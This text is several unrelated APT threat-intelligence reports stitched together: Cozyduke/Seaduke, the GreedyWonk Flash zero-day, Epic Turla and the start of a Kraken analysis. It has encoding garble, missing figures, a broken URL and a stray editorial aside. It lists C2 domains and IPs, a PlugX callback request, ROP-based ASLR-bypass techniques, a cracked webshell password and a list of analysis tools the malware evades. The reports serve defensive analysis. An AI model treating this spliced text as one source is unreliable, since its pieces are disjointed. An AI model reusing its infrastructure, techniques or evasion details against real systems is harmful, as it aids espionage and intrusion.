Cozyduke campaign used an â€œOffice Monkeysâ€​ video as a lureâ€ “ July 2014 .
The Duke group has mounted an extended campaign targeting high-profile networks over extended periods , something which is far beyond the reach of the majority of threat actors .
Its capabilities include : Attack infrastructure leveraging hundreds of compromised websites Rapidly developed malware frameworks in concurrent use Sophisticated operators with fine-tuned computer network exploitation ( CNE ) skills Although Cozyduke activity was first identified in March 2014 , it wasnâ€™t until July that the group managed to successfully compromise high-profile government networks .
Cozyduke was used throughout these attacks to harvest and exfiltrate sensitive information to the attackers .
In parallel , the Duke group was also installing separate malware onto these networks , namely Backdoor.Miniduke and the more elusive Trojan.Seaduke .
It could use these payloads to exploit networks on multiple fronts and providing it with additional persistence mechanisms .
The Miniduke payload .
In July of 2014 , the group instructed Cozyduke-infected computers to install Backdoor.Miniduke onto a compromised network .
Miniduke has been the groupâ€™s tool of choice for a number of years in espionage operations predominantly targeting government and diplomatic entities in Eastern Europe and ex-Soviet states .
â€œNemesis Geminaâ€​ appears to be the internal name for the framework used by the group to identify the project , previously reported by Kaspersky .
The following debug string was present in the sample used in these attacks : C : \Projects\nemesis-gemina\nemesis\bin\carriers\ezlzma_x86_exe.pdb This project name has been seen in Backdoor.Tinybaron ( aka Cosmicduke ) samples , which Symantec also attributes to the Duke group .
This deployment of Miniduke and the technical similarities with Cozyduke provided strong indicators as to who was behind the attacks .
The Seaduke payload These attacks were already well underway when another group began to deploy a previously unknown piece of malware .
In October 2014 , the Seaduke payload began to appear within target networks .
Although Seaduke was developed in Python , the overall framework bears a striking resemblance to Cozyduke in terms of operation .
Itâ€™s unclear why the attackers waited until October to deploy Seaduke .
Was it reserved for a more specific attack ? Was part of their cover blown , necessitating the use of an alternative framework ? The Seaduke framework was designed to be highly configurable .
Hundreds of reconfigurations were identified on compromised networks .
The communication protocol employed had many layers of encryption and obfuscation , using over 200 compromised web servers for command and control .
Seaduke required a significant investment of time and resources in the preparatory and operational phases of the attack .
Seaduke delivery .
The attackers control Cozyduke via compromised websites , issuing instructions to infected machines by uploading â€œtasksâ€​ to a database file .
Cozyduke will periodically contact these websites to retrieve task information to be executed on the local machine .
One such task ( an encoded PowerShell script ) instructed Cozyduke to download and execute Seaduke from a compromised website .
Figure 2 .
How the attacker tasks Cozer to install Seaduke .
Seaduke operation The attackers can operate Seaduke in a broadly similar fashion to Cozyduke .
The Seaduke control infrastructure is essentially distinct , opening up the possibility of sub-teams concurrently exploiting the target network .
Unlike Cozyduke , Seaduke operators upload â€œtaskâ€​ files directly to the command and-control ( C & C ) server ; there is no database as such present .
Seaduke securely communicates with the C & C server over HTTP/HTTPS beneath layers of encoding ( Base64 ) and encryption ( RC4 , AES ) .
To an untrained eye , the communications look fairly benign , no doubt an effort to stay under the radar on compromised networks .
Figure 3 .
How Seaduke operates on the target network .
Seaduke has many inbuilt commands which are available to the attackers .
They have the ability to retrieve detailed bot/system information , update bot configuration , upload files , download files , and self delete the malware from the system .
The self-delete function is interestingly called â€œseppukuâ€​ .
This is a form of Japanese ritual suicide .
Seaduke payloads .
The attackers have also developed a number of additional payloads .
Operators can push these payloads onto infected machines for very specific attacks .
Impersonation using Kerberos pass-the-ticket attacks ( Mimikatz PowerShell ) Email extraction from the MS Exchange Server using compromised credentials Archiving sensitive information Data exfiltration via legitimate cloud services Secure file deletion .
What next ? The Duke group has brought its operational capability to the next level .
Its attacks have been so bold and aggressive , that a huge amount of attention has been drawn to it , yet it appears to be unperturbed .
Its success at compromising such high-profile targets has no doubt added a few feathers to its cap .
Even the developers reveled in this fact , naming one of Seadukeâ€™s functions â€œforkmeiamfamousâ€​ .
While the group is currently keeping a lower profile , thereâ€™s no doubt it will reappear .
Some tools may have to be abandoned , some reworked and others built completely from scratch .
This attack group is in it for the long haul .
Operation GreedyWonk : Multiple Economic and Foreign Policy Sites Compromised , Serving Up Flash Zero-Day Exploit .
Less than a week after uncovering Operation SnowMan , the FireEye Dynamic Threat Intelligence cloud has identified another targeted attack campaign — this one exploiting a zero-day vulnerability in Flash .
We are collaborating with Adobe security on this issue .
Adobe has assigned the CVE identifier CVE-2014-0502 to this vulnerability and released a security bulletin .
As of this blog post , visitors to at least three nonprofit institutions — two of which focus on matters of national security and public policy — were redirected to an exploit server hosting the zero-day exploit .
We ’ re dubbing this attack “ Operation GreedyWonk . ” We believe GreedyWonk may be related to a May 2012 campaign outlined by ShadowServer , based on consistencies in tradecraft ( particularly with the websites chosen for this strategic Web compromise ) , attack infrastructure , and malware configuration properties .
The group behind this campaign appears to have sufficient resources ( such as access to zero-day exploits ) and a determination to infect visitors to foreign and public policy websites .
The threat actors likely sought to infect users to these sites for follow-on data theft , including information related to defense and public policy matters .
Discovery .
On Feb .
13 , FireEye identified a zero-day Adobe Flash exploit that affects the latest version of the Flash Player ( 12.0.0.4 and 11.7.700.261 ) .
Visitors to the Peter G .
Peterson Institute for International Economics ( www.piie.com ) were redirected to an exploit server hosting this Flash zero-day through a hidden iframe .
We subsequently found that the American Research Center in Egypt ( www.arce.org ) and the Smith Richardson Foundation ( www.srf.org ) also redirected visitors the exploit server .
All three organizations are nonprofit institutions ; the Peterson Institute and Smith Richardson Foundation engage in national security and public policy issues .
Mitigation .
To bypass Windows ’ Address Space Layout Randomization ( ASLR ) protections , this exploit targets computers with any of the following configurations :
Windows XP Windows 7 and Java 1.6 Windows 7 and an out-of-date version of Microsoft Office 2007 or 2010 .
Users can mitigate the threat by upgrading from Windows XP and updating Java and Office .
If you have Java 1.6 , update Java to the latest 1.7 version .
If you are using an out-of-date Microsoft Office 2007 or 2010 , update Microsoft Office to the latest version .
These mitigations do not patch the underlying vulnerability .
But by breaking the exploit ’ s ASLR-bypass measures , they do prevent the current in-the-wild exploit from functioning .
Vulnerability analysis .
GreedyWonk targets a previously unknown vulnerability in Adobe Flash .
The vulnerability permits an attacker to overwrite the vftable pointer of a Flash object to redirect code execution .
ASLR bypass .
The attack uses only known ASLR bypasses .
Details of these techniques are available from our previous blog post on the subject ( in the “ Non-ASLR modules ” section ) .
For Windows XP , the attackers build a return-oriented programming ( ROP ) chain of MSVCRT ( Visual C runtime ) gadgets with hard-coded base addresses for English ( “ en ” ) and Chinese ( “ zh-cn ” and “ zh-tw ” ) .
On Windows 7 , the attackers use a hard-coded ROP chain for MSVCR71.dll ( Visual C++ runtime ) if the user has Java 1.6 , and a hard-coded ROP chain for HXDS.dll ( Help Data Services Module ) if the user has Microsoft Office 2007 or 2010 .
Java 1.6 is no longer supported and does not receive security updates .
In addition to the MSVCR71.dll ASLR bypass , a variety of widely exploited code-execution vulnerabilities exist in Java 1.6 .
That ’ s why FireEye strongly recommends upgrading to Java 1.7 .
The Microsoft Office HXDS.dll ASLR bypass was patched at the end of 2013 .
More details about this bypass are addressed by Microsoft ’ s Security Bulletin MS13-106 and an accompanying blog entry .
FireEye strongly recommends updating Microsoft Office 2007 and 2010 with the latest patches .
Shellcode analysis .
The shellcode is downloaded in ActionScript as a GIF image .
Once ROP marks the shellcode as executable using Windows ’ VirtualProtect function , it downloads an executable via the InternetOpenURLA and InternetReadFile functions .
Then it writes the file to disk with CreateFileA and WriteFile functions .
Finally , it runs the file using the WinExec function .
PlugX/Kaba payload analysis .
Once the exploit succeeds , a PlugX/Kaba remote access tool ( RAT ) payload with the MD5 hash 507aed81e3106da8c50efb3a045c5e2b is installed on the compromised endpoint .
This PlugX sample was compiled on Feb .
12 , one day before we first observed it , indicating that it was deployed specifically for this campaign .
This PlugX payload was configured with the following command-and-control ( CnC ) domains :
java.ns1.name adservice.no-ip.org wmi.ns01.us .
Sample callback traffic was as follows :
POST /D28419029043311C6F8BF9F5 HTTP/1.1 Accept : * / * HHV1 : 0 HHV2 : 0 HHV3 : 61456 HHV4 : 1 User-Agent : Mozilla/4.0 ( compatible ; MSIE 6.0 ; Windows NT 5.1 ; InfoPath.2 ; .NET CLR 2.0.50727 ; SV1 ) Host : java.ns1.name Content-Length : 0 Connection : Keep-Alive Cache-Control : no-cache .
Campaign analysis .
Both java.ns1.name and adservice.no-ip.org resolved to 74.126.177.68 on Feb .
18 , 2014 .
Passive DNS analysis reveals that the domain wmi.ns01.us previously resolved to 103.246.246.103 between July 4 , 2013 and July 15 , 2013 and 192.74.246.219 on Feb .
17 , 2014 .
java.ns1.name also resolved to 192.74.246.219 on February 18 .
Domain First Seen Last Seen IP Address adservice.no-ip.org 2014-02-18 2014-02-19 74.126.177.68 java.ns1.name 2014-02-18 2014-02-19 74.126.177.68 java.ns1.name 2014-02-18 2014-02-18 192.74.246.219 wmi.ns01.us 2014-02-17 2014-02-17 192.74.246.219 proxy.ddns.info 2013-05-02 2014-02-18 103.246.246.103 updatedns.ns02.us 2013-09-06 2013-09-06 103.246.246.103 updatedns.ns01.us 2013-09-06 2013-09-06 103.246.246.103 wmi.ns01.us 2013-07-04 2013-07-15 103.246.246.103 .
Further research uncovered a number of older malware samples connecting to the same domain wmi.ns01.us .
MD5 Family Compile Alternate C2s Time 7995a9a6a889b914e208eb924e459ebc PlugX 2012-06-09 fuckchina.govnb.com bf60b8d26bc0c94dda2e3471de6ec977 PlugX 2010-03-15 microsafes.no-ip.org fd69793bd63c44bbb22f9c4d46873252 Poison 2013-03-07 N/A Ivy 88b375e3b5c50a3e6c881bc96c926928 Poison 2012-06-11 N/A Ivy cd07a9e49b1f909e1bd9e39a7a6e56b4 Poison 2012-06-11 N/A Ivy .
Domain First Seen Last Seen IP Address fuckchina.govnb.com 2013-12-11 2013-12-11 204.200.222.136 microsafes.no-ip.org 2014-02-12 2014-02-12 74.126.177.70 microsafes.no-ip.org 2013-12-04 2013-12-04 74.126.177.241 .
The Poison Ivy variants that connected to the domain wmi.ns01.us had the following unique configuration properties :
MD5 Password Mutex fd69793bd63c44bbb22f9c4d46873252 java7 NBCD * & ^FE 88b375e3b5c50a3e6c881bc96c926928 admin ytf^ & ^333 cd07a9e49b1f909e1bd9e39a7a6e56b4 admin ytf^ & ^333 .
We found a related Poison Ivy sample ( MD5 8936c87a08ffa56d19fdb87588e35952 ) with the same “ java7 ” password , which was dropped by an Adobe Flash exploit ( CVE-2012-0779 ) .
In this previous incident , visitors to the Center for Defense Information website ( www.cdi.org — also an organization involved in defense matters — were redirected to an exploit server at 159.54.62.92 .
This exploit server hosted a Flash exploit file named BrightBalls.swf ( MD5 1ec5141051776ec9092db92050192758 ) .
This exploit , in turn , dropped the Poison Ivy variant .
In addition to using the same password “ java7 , ” this variant was configured with the mutex with the similar pattern of “ YFds * & ^ff ” and connected to a CnC server at windows.ddns.us .
Using passive DNS analysis , we see the domains windows.ddns.us and wmi.ns01.us both resolved to 76.73.80.188 in mid-2012 .
Domain First Seen Last Seen IP Address wmi.ns01.us 2012-07-07 2012-09-19 76.73.80.188 windows.ddns.us 2012-05-23 2012-06-10 76.73.80.188 .
During another earlier compromise of the same www.cdi.org website , visitors were redirected to a Java exploit test.jar ( MD5 7d810e3564c4eb95bcb3d11ce191208e ) .
This jar file exploited CVE-2012-0507 and dropped a Poison Ivy payload with the hash ( MD5 52aa791a524b61b129344f10b4712f52 ) .
This Poison Ivy variant connected to a CnC server at ids.ns01.us .
The domain ids.ns01.us also overlaps with the domain wmi.ns01.us on the IP 194.183.224.75 .
Domain First Seen Last Seen IP Address wmi.ns01.us 2012-07-03 2012-07-04 194.183.224.75 ids.ns01.us 2012-04-23 2012-05-18 194.183.224.75 .
The Poison Ivy sample referenced above ( MD5 fd69793bd63c44bbb22f9c4d46873252 ) was delivered via an exploit chain that began with a redirect from the Center for European Policy Studies ( www.ceps.be ) .
In this case , visitors were redirected from www.ceps.be to a Java exploit hosted on shop.fujifilm.be .
In what is certainly not a coincidence , we also observed www.arce.org ( one of the sites redirecting to the current Flash exploit ) also redirect visitors to the Java exploit on shop.fujifilm.be in 2013 .
Conclusion .
This threat actor clearly seeks out and compromises websites of organizations related to international security policy , defense topics , and other non-profit sociocultural issues .
The actor either maintains persistence on these sites for extended periods of time or is able to re-compromise them periodically .
This actor also has early access to a number of zero-day exploits , including Flash and Java , and deploys a variety of malware families on compromised systems .
Based on these and other observations , we conclude that this actor has the tradecraft abilities and resources to remain a credible threat in at least the mid term .
The Epic Turla Operation .
Technical Appendix with IOCs .
Executive Summary .
Over the last 10 months , Kaspersky Lab researchers have analyzed a massive cyber-espionage operation which we call `` EpicTurla `` .
The attackers behind Epic Turla have infected several hundred computers in more than 45 countries , including government institutions , embassies , military , education , research and pharmaceutical companies .
The attacks are known to have used at least two zero-day exploits :
CVE-2013-5065 Privilege escalation vulnerability in Windows XP and Windows 2003 CVE-2013-3346 Arbitrary code-execution vulnerability in Adobe Reader .
We also observed exploits against older ( patched ) vulnerabilities , social engineering techniques and watering hole strategies in these attacks .
The primary backdoor used in the Epic attacks is also known as `` WorldCupSec '' , `` TadjMakhal '' , `` Wipbot '' or `` Tavdig '' .
When G-Data published on Turla/Uroburos back in February , several questions remained unanswered .
One big unknown was the infection vector for Turla ( aka Snake or Uroburos ) .
Our analysis indicates that victims are infected via a sophisticated multi-stage attack , which begins with the Epic Turla .
In time , as the attackers gain confidence , this is upgraded to more sophisticated backdoors , such as the Carbon/Cobra system .
Sometimes , both backdoors are run in tandem , and used to `` rescue '' each other if communications are lost with one of the backdoors .
Once the attackers obtain the necessary credentials without the victim noticing , they deploy the rootkit and other extreme persistence mechanisms .
The attacks are still ongoing as of July 2014 , actively targeting users in Europe and the Middle East .
Note : A full analysis of the Epic attacks is available to the Kaspersky Intelligent Services subscribers .
Contact : intelreports @ kaspersky.com .
The Epic Turla attacks .
The attacks in this campaign fall into several different categories depending on the vector used in the initial compromise :
Spearphishing e-mails with Adobe PDF exploits ( CVE-2013-3346 + CVE-2013-5065 ) Social engineering to trick the user into running malware installers with `` .SCR '' extension , sometimes packed with RAR Watering hole attacks using Java exploits ( CVE-2012-1723 ) , Flash exploits ( unknown ) or Internet Explorer 6,7,8 exploits ( unknown ) Watering hole attacks that rely on social engineering to trick the user into running fake `` Flash Player '' malware installers .
The attackers use both direct spearphishing and watering hole attacks to infect their victims .
Watering holes ( waterholes ) are websites of interest to the victims that have been compromised by the attackers and injected to serve malicious code .
So far we have n't been able to locate any e-mail used against the victims , only the attachments .
The PDF attachments do not show any `` lure '' to the victim when opened , however , the SCR packages sometime show a clean PDF upon successful installation .
Some of known attachment names used in the spearphishing attacks are :
‫ ( ﺗﻤﺮ ﺟﻨ '' ﻒ‬.rar ( translation from Arabic : `` Geneva conference.rar '' ) NATO position on Syria.scr Note_№107-41D.pdf Talking Points.scr border_security_protocol.rar Security protocol.scr Program.scr .
In some cases , these filenames can provide clues about the type of victims the attackers are targeting .
The watering hole attacks .
Currently , the Epic attackers run a vast network of watering holes that target visitors with surgical precision .
Some of the injected websites include :
The website of the City Hall of Pinor , Spain .
A site promoting entrepreneurship in the border area of Romania .
Palestinian Authority Ministry of Foreign Affairs .
In total , we observed more than 100 injected websites .
Currently , the largest number of injected sites is in Romania .
Here 's a statistic on the injected websites :
The distribution is obviously not random , and it reflects some of the interests of the attackers .
For instance , in Romania many of the infected sites are in the Mures region , while many of the Spanish infected sites belong to local governments ( City Hall ) .
Most of the infected sites use the TYPO3 CMS ( see : http : //typo3.org/ ) , which could indicate the attackers are abusing a specific vulnerability in this publishing platform .
Injected websites load a remote JavaScript into the victim 's browser :
The script `` sitenavigatoin.js '' is a Pinlady-style browser and plugin detection script , which in turn , redirects to a PHP script sometimes called main.php or wreq.php .
Sometimes , the attackers register the .JPG extension with the PHP handler on the server , using `` JPG '' files to run PHP scripts :
Profiling script .
The main exploitation script `` wreq.php '' , `` main.php '' or `` main.jpg '' performs a numbers of tasks .
We have located several versions of this script which attempt various exploitation mechanisms .
One version of this script attempts to exploit Internet Explorer versions 6 , 7 and 8 :
Internet Explorer exploitation script .
Unfortunately , the Internet Explorer exploits have not yet been retrieved .
Another more recent version attempts to exploit Oracle Sun Java and Adobe Flash Player :
Java and Flash Player exploitation scripts .
Although the Flash Player exploits could n't be retrieved , we did manage to obtain the Java exploits :
Name MD5 allj.html 536eca0defc14eff0a38b64c74e03c79 allj.jar f41077c4734ef27dec41c89223136cf8 allj64.html 15060a4b998d8e288589d31ccd230f86 allj64.jar e481f5ea90d684e5986e70e6338539b4 lstj.jar 21cbc17b28126b88b954b3b123958b46 lstj.html acae4a875cd160c015adfdea57bd62c4 .
The Java files exploit a popular vulnerability , CVE-2012-1723 , in various configurations .
The payload dropped by these Java exploits is the following :
MD5 : d7ca9cf72753df7392bfeea834bcf992 .
The Java exploit use a special loader that attempts to inject the final Epic backdoor payload into explorer.exe .
The backdoor extracted from the Java exploits has the following C & C hardcoded inside :
www.arshinmalalan.com/themes/v6/templates/css/in.php .
This C & C is still online at the moment although it redirects to a currently suspended page at `` http://busandcoachdirectory.com.au `` .
For a full list of C & C servers , please see the Appendix .
The Epic Turla attackers are extremely dynamic in using exploits or different methods depending on what is available at the moment .
Most recently , we observed them using yet another technique coupled with watering hole attacks .
This takes advantage of social engineering to trick the user into running a fake Flash Player ( MD5 : 030f5fdb78bfc1ce7b459d3cc2cf1877 ) :
In at least one case , they tried to trick the user into downloading and running a fake Microsoft Security Essentials app ( MD5 : 89b0f1a3a667e5cd43f5670e12dba411 ) :
The fake application is signed by a valid digital certificate from Sysprint AG :
Serial number : 00 c0 a3 9e 33 ec 8b ea 47 72 de 4b dc b7 49 bb 95 Thumbprint : 24 21 58 64 f1 28 97 2b 26 22 17 2d ee 62 82 46 07 99 ca 46 .
Valid signature from Sysprint AG on Epic dropper .
This file was distributed from the Ministry of Foreign Affairs of Tajikistan 's website , at `` http : //mfa.tj/upload/security.php '' .
The file is a .NET application that contains an encrypted resource .
This drops the malicious file with the MD5 7731d42b043865559258464fe1c98513 .
This is an Epic backdoor which connects to the following C & Cs , with a generic internal ID of 1156fd22 3443-4344-c4ffff :
http://homaxcompany.com/components/com_sitemap / http://www.hadilotfi.com/wp-content/themes/profile / .
A full list with all the C & C server URLs that we recovered from the samples can be found in the technical Appendix .
The Epic command-and-control infrastructure .
The Epic backdoors are commanded by a huge network of hacked servers that deliver command and control functionality .
The huge network commanded by the Epic Turla attackers serves multiple purposes .
For instance , the motherships function as both exploitation sites and command and control panels for the malware .
Here 's how the big picture looks like :
Epic Turla lifecycle .
The first level of command and control proxies generally talk to a second level of proxies , which in turn , talk to the `` mothership '' server .
The mothership server is generally a VPS , which runs the Control panel software used to interact with the victims .
The attackers operate the mothership using a network of proxies and VPN servers for anonymity reasons .
The mothership also work as the exploitation servers used in the watering hole attacks , delivering Java , IE or fake applications to the victim .
We were able to get a copy of one of the motherships , which provided some insight into the operation .
It runs a control panel which is password protected :
Epic mothership control panel login .
Once logged into the Control panel , the attackers can see a general overview of the system including the number of interesting potential targets :
Epic control panel status overview .
A very interesting file on the servers is task.css , where the attackers define the IP ranges they are interested in .
To change the file , they are using the `` Task editor '' from the menu .
Depending on the `` tasks '' , they will decide whether to infect the visitors or not .
In this case , we found they targeted two ranges belonging to :
`` Country A '' Federal Government Network `` Country B '' Government Telecommunications and Informatics Services Network .
It should be noted though , the fact that the attackers were targeting these ranges does n't necessarily mean they also got infected .
Some other unknown IPs were also observed in the targeting schedules .
There is also an `` except.css '' file where attackers log the reasons they did n't try to exploit certain visitors .
There are three possible values :
TRY DO N'T TRY > Version of the browser and OS does not meet the conditions DO N'T TRY > ( 2012-09-19 10:02:04 ) checktime < 60 .
These are the `` do n't meet the conditions '' reasons observed in the logs :
Windows 7 or 2008 R2 MSIE 8.0 Mozilla/4.0 ( compatible ; MSIE 8.0 ; Windows NT 6.1 ; WOW64 ; Trident/4.0 ; SLCC2 ; .NET CLR 2.0.50727 ; .NET CLR 3.5.30729 ; .NET CLR 3.0.30729 ; .NET CLR 1.1.4322 ; .NET4.0C ; .NET4.0E ) Adobe Shockwave 11.5.1.601 Adobe Flash 10.3.181.14 Adobe Reader 10.1.0.0 Win Media Player 12.0.7601.17514 Quick Time null MS Word null Java null .
The Epic / Tavdig / Wipbot backdoor .
For this first stage of the attack , the threat actor uses a custom backdoor .
In some cases , the backdoor is packaged together with the CVE-2013-5065 EoP exploit and heavily obfuscated .
This makes the analysis more difficult .
The CVE-2013-5065 exploit allows the backdoor to achieve administrator privileges on the system and run unrestricted .
This exploit only works on unpatched Microsoft Windows XP systems .
Other known detection names for the backdoor is Trojan.Wipbot ( Symantec ) or Tavdig .
The main backdoor is about 60KB in size and implements a C & C protocol on top of normal HTTP requests .
The communication protocol uses .
requests in the C & C replies , which the malware decrypts and processes .
The replies are sent back to the C & C through the same channel .
The malware behavior is defined by a configuration block .
The configuration block usually contains two hard-coded C & C URLs .
He have also seen one case where the configuration block contains just one URL .
The configuration can also be updated on the fly by the attackers , via the C & C .
The backdoor attempts to identify the following processes and , if found , it will terminate itself :
tcpdump.exe windump.exe ethereal.exe wireshark.exe ettercap.exe snoop.exe dsniff.exe .
It contains an internal unique ID , which is used to identify the victim to the C & C .
Most samples , especially old ones , have the ID 1156fd22-3443-4344-c4ffff .
Once a victim is confirmed as `` interesting '' , the attackers upload another Epic backdoor which has a unique ID used to control this specific victim .
During the first C & C call , the backdoor sends a pack with the victim 's system information .
All further information sent to the C & C is encrypted with a public key framework , making decryption impossible .
The commands from the C & C are encrypted in a simpler manner and can be decrypted if intercepted because the secret key is hardcoded in the malware .
Through monitoring , we were able to capture a large amount of commands sent to the victims by the attackers , providing an unique view into this operation .
Here 's a look at one of the encrypted server replies :
Once a victim is infected and `` checks in '' with the server , the attackers send a template of commands :
Next , the attackers try to move through the victim 's network using pre-defined or collected passwords :
Listing all .doc files recursively is also a common `` theme '' :
In total , we have decoded several hundreds of these command packages delivered to the victims , providing an unique insight into the inner workings of the attackers .
In addition to generic searches , some very specific lookups have been observed as well .
These include searches for :
* NATO * .msg eu energy dialogue * . * EU * .msg Budapest * .msg .
In this case , the attackers were interested to find e-mails related to `` NATO '' , `` Energy Dialogue within European Unition '' and so on .
For some of the C & C servers , the attackers implemented RSA encryption for the C & C logs , which makes it impossible to decrypt them .
This scheme was implemented in April 2014 .
Lateral movement and upgrade to more sophisticated backdoors .
Once a victim is compromised , the attackers upload several tools that are used for lateral movement .
One such tool observed in the attacks and saved as `` C : \Documents and Settings\All users\Start Menu\Programs\Startup\winsvclg.exe '' is :
Name : winsvclg.exe MD5 : a3cbf6179d437909eb532b7319b3dafe Compiled : Tue Oct 02 13:51:50 2012 .
This is a keylogger tool that creates % temp % \~DFD3O8.tmp .
Note : the filename can change across victims .
On one Central Asian government 's Ministry of Foreign Affairs victim system , the filename used was `` adobe32updt.exe '' .
In addition to these custom tools , we observed the usage of standard administration utilities .
For instance , another tool often uploaded by the attackers to the victim 's machine is `` winrs.exe '' :
Name : winrs.exe MD5 : 1369fee289fe7798a02cde100a5e91d8 .
This is an UPX packed binary , which contains the genuine `` dnsquery.exe '' tool from Microsoft , unpacked MD5 : c0c03b71684eb0545ef9182f5f9928ca .
In several cases , an interesting update has been observed a malware from a different , yet related family .
Size : 275,968 bytes MD5 : e9580b6b13822090db018c320e80865f Compiled : Thu Nov 08 11:05:35 2012 another example : Size : 218,112 bytes MD5 : 071d3b60ebec2095165b6879e41211f2 Compiled : Thu Nov 08 11:04:39 2012 .
This backdoor is more sophisticated and belongs to the next level of cyber-espionage tools called the `` Carbon system '' or Cobra by the Turla attackers .
Several plugins for the `` Carbon system '' are known to exist .
Decoded configuration for e9580b6b13822090db018c320e80865f .
Note : the command and control servers www.losguayaberos.com and thebesttothbrushes.com have been sinkholed by Kaspersky Lab .
Other packages delivered to the victims include :
MD5 : c7617251d523f3bc4189d53df1985ca9 MD5 : 0f76ef2e6572befdc2ca1ca2ab15e5a1 .
These top level packages deploy both updated Epic backdoors and Turla Carbon system backdoors to confirmed victims , effectively linking the Epic and Turla Carbon operations together .
The Turla Carbon dropper from these packages has the following properties :
MD5 : cb1b68d9971c2353c2d6a8119c49b51f .
This is called internally by the authors `` Carbon System '' , part of the `` Cobra '' project , as it can be seen from the debug path inside :
This acts as a dropper for the following modules , both 32 and 64 bit :
MD5 Resource number 4c1017de62ea4788c7c8058a8f825a2d 101 43e896ede6fe025ee90f7f27c6d376a4 102 e6d1dcc6c2601e592f2b03f35b06fa8f 104 554450c1ecb925693fedbb9e56702646 105 df230db9bddf200b24d8744ad84d80e8 161 91a5594343b47462ebd6266a9c40abbe 162 244505129d96be57134cb00f27d4359c 164 4ae7e6011b550372d2a73ab3b4d67096 165 .
The Carbon system is in essence an extensible platform , very similar to other attack platforms such as the Tilded platform or the Flame platform .
The plugins for the Carbon system can be easily recognized as they always feature at least two exports named :
ModuleStart ModuleStop .
Carbon system plugin with characteristic exports .
Several Epic backdoors appear to have been designed to work as Carbon system plugins as well they require a specialized loader to start in victim systems that do not have the Carbon system deployed .
Some modules have artifacts which indicate the Carbon system is already at version 3.x , although the exact Carbon system version is very rarely seen in samples :
The author of the Carbon module above can be also seen in the code , as `` gilg '' , which also authored several other Turla modules .
We are planning to cover the Turla Carbon system with more details in a future report .
Language artifacts .
The payload recovered from one of the mothership servers ( at http:p , MD5 : 4dc22c1695d1f275c3b6e503a1b171f5 , Compiled : Thu Sep 06 14:09:55 2012 ) contains two modules , a loader/injector and a backdoor .
Internally , the backdoor is named `` Zagruzchick.dll '' :
The word `` Zagruzchick '' means `` boot loader '' in Russian .
The Control panel for the Epic motherships also sets the language to codepage `` 1251 '' :
Codepage 1251 is commonly used to render Cyrillic characters .
There are other indications that the attackers are not native English language speakers :
Password it´s wrong ! Count successful more MAX File is not exists File is exists for edit .
The sample e9580b6b13822090db018c320e80865f that was delivered to several Epic victims as an upgraded backdoor , has the compilation code page language set to `` LANG_RUSSIAN '' .
The threat actor behind the `` Epic '' operation uses mainly hacked servers to host their proxies .
The hacked servers are controlled through the use of a PHP webshell .
This shell is password protected ; the password is checked against an MD5 hash :
The MD5 `` af3e8be26c63c4dd066935629cf9bac8 `` has been solved by Kaspersky Lab as the password `` kenpachi '' .
In February 2014 we observed the Miniduke threat actor using the same backdoor on their hacked servers , although using a much stronger password .
Once again , it is also interesting to point out the usage of Codepage 1251 in the webshell , which is used to render Cyrillic characters .
There appears to be several links between Turla and Miniduke , but we will leave that for a future blogpost .
Victim statistics .
On some of the C & C servers used in the Epic attacks , we were able to identify detailed victim statistics , which were saved for debugging purposes by the attackers .
This is the country distribution for the top 20 affected countries by victim 's IP :
According to the public information available for the victims ' IPs , targets of `` Epic '' belong to the following categories :
Government Ministry of interior ( EU country ) Ministry of trade and commerce ( EU country ) Ministry of foreign/external affairs ( Asian country , EU country ) Intelligence ( Middle East , EU Country ) Embassies Military ( EU country ) Education Research ( Middle East ) Pharmaceutical companies Unknown ( impossible to determine based on IP/existing data ) .
Summary .
When G-Data published their Turla paper , there were few details publicly available on how victims get infected with this malware campaign .
Our analysis indicates this is a sophisticated multi-stage infection ; which begins with Epic Turla .
This is used to gain a foothold and validate the high profile victim .
If the victim is interesting , they get upgraded to the Turla Carbon system .
Most recently , we observed this attack against a Kaspersky Lab user on August 5 , 2014 , indicating the operation remains fresh and ongoing .
Note : A full analysis of the Epic attacks is available to the Kaspersky Intelligent Services customers .
Contact : intelreports @ kaspersky.com We would like to add the following at the end of the blogpost , right before the detection names :
Further reading .
If you 'd like to read more about Turla/Uroburos , here 's a few recommendations :
G-Data 's paper `` Uroburos Highly complex espionage software with Russian roots '' BAE Systems analysis of `` The Snake campaign '' `` Uroburos : the snake rootkit '' , technical analysis by deresz and tecamac `` TR-25 Analysis Turla / Pfinet / Snake/ Uroburos '' by CIRCL.LU .
Kaspersky products ' detection names for all the malware samples described in this post :
Backdoor.Win32.Turla.an Backdoor.Win32.Turla.ao Exploit.JS . CVE-2013-2729 .a Exploit.JS.Pdfka.gkx Exploit.Java . CVE-2012-1723 .eh Exploit.Java . CVE-2012-1723 .ou Exploit.Java . CVE-2012-1723 .ov Exploit.Java . CVE-2012-1723 .ow Exploit.Java . CVE-2012-4681 .at Exploit.Java . CVE-2012-4681 .au Exploit.MSExcel . CVE-2009-3129 .u HEUR : Exploit.Java . CVE-2012-1723 .gen HEUR : Exploit.Java . CVE-2012-4681 .gen HEUR : Exploit.Java.Generic HEUR : Exploit.Script.Generic HEUR : Trojan.Script.Generic HEUR : Trojan.Win32.Epiccosplay.gen HEUR : Trojan.Win32.Generic HackTool.Win32.Agent.vhs HackTool.Win64.Agent.b Rootkit.Win32.Turla.d Trojan-Dropper.Win32.Dapato.dwua Trojan-Dropper.Win32.Demp.rib Trojan-Dropper.Win32.Injector.jtxs Trojan-Dropper.Win32.Injector.jtxt Trojan-Dropper.Win32.Injector.jznj Trojan-Dropper.Win32.Injector.jznk Trojan-Dropper.Win32.Injector.khqw Trojan-Dropper.Win32.Injector.kkkc Trojan-Dropper.Win32.Turla.b Trojan-Dropper.Win32.Turla.d Trojan.HTML.Epiccosplay.a Trojan.Win32.Agent.iber Trojan.Win32.Agent.ibgm Trojan.Win32.Agentb.adzu Trojan.Win32.Inject.iujx Trojan.Win32.Nus.g Trojan.Win32.Nus.h .
Technical Appendix with IOCs .
2015-05-08 , 8:46 AM .
G Data International G Data Germany RSS Feed back 07.05.2015 , Author : Paul Rascagnères .
Dissecting the “ Kraken ” Analysis of the Kraken malware that was used for a targeted attack in UAE .
In January 2015 , unidentified attackers attempted to infiltrate a multi-national enterprise based in the United Arab Emirates , using a spear phishing attack with a crafted MS Word document attached to the message .
Once it has reached its target , the payload used was designed to work as an information stealer and reconnaissance tool .
G DATA ’ s security experts identified the malware behind this attack and reveal information about the actual power of the malware ’ s tentacles .
In this article , the G DATA SecurityLabs will have a look at the following topics : an example of the spear phishing campaign , sent only a few days after the malware has been advertised the marketing approach to sell the malware the analysis of some of Kraken ’ s features theories about why Kraken has been used as malware in a targeted attack .
